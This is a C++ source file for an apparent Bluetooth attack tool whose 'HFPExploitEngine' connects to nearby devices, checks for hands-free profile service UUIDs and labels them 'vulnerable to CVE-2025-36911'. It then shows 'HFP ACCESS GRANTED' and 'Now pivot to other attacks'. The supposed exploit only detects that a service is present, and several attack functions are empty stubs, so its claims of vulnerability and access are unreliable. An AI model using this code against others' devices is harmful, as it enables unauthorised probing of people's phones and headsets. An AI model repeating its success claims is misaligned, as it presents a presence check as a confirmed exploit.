#include "HFP_Exploit.h"
#include "core/display.h"
#include "core/utils.h"
#include <globals.h>

extern void showAttackProgress(const char* message, uint16_t color);
extern void showAttackResult(bool success, const char* message);
extern void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor);
extern bool confirmAttack(const char* targetName);

bool HFPExploitEngine::testCVE202536911(NimBLEAddress target) {
    showAttackProgress("Testing CVE-2025-36911...", TFT_WHITE);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;
    
    pClient->setConnectTimeout(5);
    bool connected = pClient->connect(target, false);
    
    if(!connected) {
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    bool hasHFP = isHFPServiceAvailable(pClient);
    
    if(hasHFP) {
        try {
            NimBLERemoteService* hfpService = pClient->getService(NimBLEUUID((uint16_t)0x111E));
            if(!hfpService) hfpService = pClient->getService(NimBLEUUID((uint16_t)0x111F));
            
            if(hfpService) {
                std::vector<NimBLERemoteCharacteristic*> chars = hfpService->getCharacteristics(true);
                if(chars.size() > 0) {
                    pClient->disconnect();
                    NimBLEDevice::deleteClient(pClient);
                    return true;
                }
            }
        } catch(...) {}
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool HFPExploitEngine::isHFPServiceAvailable(NimBLEClient* client) {
    if(!client || !client->isConnected()) return false;
    
    NimBLERemoteService* hfpService = client->getService(NimBLEUUID((uint16_t)0x111E));
    if(!hfpService) hfpService = client->getService(NimBLEUUID((uint16_t)0x111F));
    
    return (hfpService != nullptr);
}

bool HFPExploitEngine::establishHFPConnection(NimBLEAddress target) {
    showAttackProgress("Attempting HFP connection...", TFT_YELLOW);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;
    
    pClient->setConnectTimeout(8);
    bool connected = pClient->connect(target, false);
    
    if(connected && isHFPServiceAvailable(pClient)) {
        showAttackProgress("HFP connection successful!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool HFPExploitEngine::executeHFPAttackChain(NimBLEAddress target) {
    if(!testCVE202536911(target)) {
        showAttackResult(false, "Device not vulnerable");
        return false;
    }
    
    showAttackProgress("Device vulnerable! Attempting HFP connection...", TFT_GREEN);
    
    if(establishHFPConnection(target)) {
        std::vector<String> lines;
        lines.push_back("HFP ATTACK CHAIN SUCCESS");
        lines.push_back("Target: " + String(target.toString().c_str()));
        lines.push_back("Status: HFP CONNECTION ESTABLISHED");
        lines.push_back("");
        lines.push_back("Device vulnerable to CVE-2025-36911");
        lines.push_back("HFP access achieved");
        lines.push_back("");
        lines.push_back("Now pivot to other attacks...");
        showDeviceInfoScreen("HFP ACCESS GRANTED", lines, TFT_GREEN, TFT_BLACK);
        return true;
    }
    
    showAttackResult(false, "Could not establish HFP connection");
    return false;
}

bool HFPExploitEngine::attemptHFPPivot(NimBLEAddress target) {
    return executeHFPAttackChain(target);
}

bool HFPExploitEngine::attemptHFPHandshake(NimBLEAddress target) {
    return false;
}

bool HFPExploitEngine::sendHFPPairingRequest(NimBLEAddress target) {
    return false;
}

std::vector<String> HFPExploitEngine::getHFPAttributes(NimBLEAddress target) {
    std::vector<String> attrs;
    return attrs;
}